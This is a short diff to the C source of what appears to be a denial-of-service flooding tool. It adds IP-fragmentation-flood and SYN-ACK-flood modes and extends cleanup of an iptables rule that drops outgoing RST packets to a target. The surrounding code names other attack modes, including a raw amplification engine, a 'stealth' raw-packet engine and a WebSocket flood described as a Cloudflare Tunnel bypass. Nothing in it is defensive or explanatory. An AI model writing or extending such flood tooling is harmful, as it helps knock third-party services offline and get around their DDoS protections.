@@ -61,7 +61,7 @@ void handle_sigint(int sig) {
             disable_rst_drop(args.xdp_interface);
         }
     }
-    if (args.is_v17_tcp_bypass || args.is_v18_tcp || args.is_v18_tls) {
+    if (args.is_v17_tcp_bypass || args.is_v18_tcp || args.is_v18_tls || args.is_frag_flood || args.is_synack_flood) {
         char rst_cmd[512];
         snprintf(rst_cmd, sizeof(rst_cmd),
             "iptables -D OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP 2>/dev/null",
@@ -117,6 +117,8 @@ int main(int argc, char *argv[]) {
     if (strstr(args.mode, "quic_v18")) args.is_v18_quic = 1;
     if (strstr(args.mode, "tls_v18") || strstr(args.mode, "v18_tls") || strstr(args.mode, "tls")) { args.is_v18_tls = 1; args.is_v17_tcp_bypass = 1; } // TLS uses V17 3WHS engine
     if (strstr(args.mode, "v18_tcp")) { args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // Pure TCP: 3WHS engine, no TLS
+    if (strstr(args.mode, "frag_flood")) { args.is_frag_flood = 1; } // IP Fragmentation flood
+    if (strstr(args.mode, "synack_flood")) { args.is_synack_flood = 1; } // SYN-ACK flood
     if (strstr(args.mode, "stealth")) { args.is_stealth = 1; args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // AF_PACKET raw engine
     if (strstr(args.mode, "v20_ws")) { args.is_v20_ws = 1; } // WebSocket L7 flood (CF Tunnel bypass)
     if (strstr(args.mode, "v19_tcp")) { args.is_v19_tcp = 1; args.is_v15_raw_amp = 1; }
